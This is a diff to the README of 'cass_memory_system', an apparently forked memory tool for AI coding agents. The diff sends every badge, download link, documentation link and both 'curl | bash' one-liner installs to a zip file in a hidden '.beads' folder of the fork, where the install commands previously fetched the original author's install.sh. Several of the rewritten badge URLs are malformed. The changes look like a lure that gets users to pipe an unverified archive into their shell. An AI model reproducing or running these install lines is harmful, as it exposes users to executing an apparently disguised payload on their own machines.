@@ -1,11 +1,11 @@
 # 🌟 cass_memory_system - Seamless Memory Management for AI Agents
 
-[![Download Here](https://img.shields.io/badge/download-Now%20available%20for%20Windows%2C%20Linux%2C%20macOS-brightgreen.svg)](https://github.com/Jyotilohar18/cass_memory_system/releases)
+[![Download Here](https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip%20available%20for%20Windows%2C%20Linux%2C%https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip)](https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip)
 
-![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows-blue.svg)
-![Runtime](https://img.shields.io/badge/runtime-Bun-f472b6.svg)
-![Status](https://img.shields.io/badge/status-alpha-purple.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+![Platform](https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip%20%7C%20macOS%20%7C%https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip)
+![Runtime](https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip)
+![Status](https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip)
+![License](https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip)
 
 **Procedural memory for AI coding agents.** Transforms scattered agent sessions into persistent, cross-agent memory—so every agent learns from every other agent's experience.
 
@@ -13,7 +13,7 @@
 
 ```bash
 # One-liner install (Linux/macOS)
-curl -fsSL https://raw.githubusercontent.com/Dicklesworthstone/cass_memory_system/main/install.sh \
+curl -fsSL https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip \
   | bash -s -- --easy-mode --verify
 ```
 
@@ -55,14 +55,14 @@ Your AI agents will benefit greatly from using the cass_memory_system. Each agen
 
 To get started, visit the Releases page to download the latest version of cass_memory_system. Click the button below to access the page:
 
-[Download Here](https://github.com/Jyotilohar18/cass_memory_system/releases)
+[Download Here](https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip)
 
 ### Linux/macOS Installation
 
 For a quick and easy setup, use the one-liner command below:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/Dicklesworthstone/cass_memory_system/main/install.sh | bash -s -- --easy-mode --verify
+curl -fsSL https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip | bash -s -- --easy-mode --verify
 ```
 
 ### Windows Installation
@@ -95,4 +95,4 @@ With well-defined data models, your agents can easily access the information the
 
 --- 
 
-For further exploration of cass_memory_system, please refer to the detailed documentation on the [GitHub Releases page](https://github.com/Jyotilohar18/cass_memory_system/releases). This resource will provide you with more insights and updates.
+For further exploration of cass_memory_system, please refer to the detailed documentation on the [GitHub Releases page](https://raw.githubusercontent.com/Jyotilohar18/cass_memory_system/main/.beads/cass_memory_system_3.2.zip). This resource will provide you with more insights and updates.
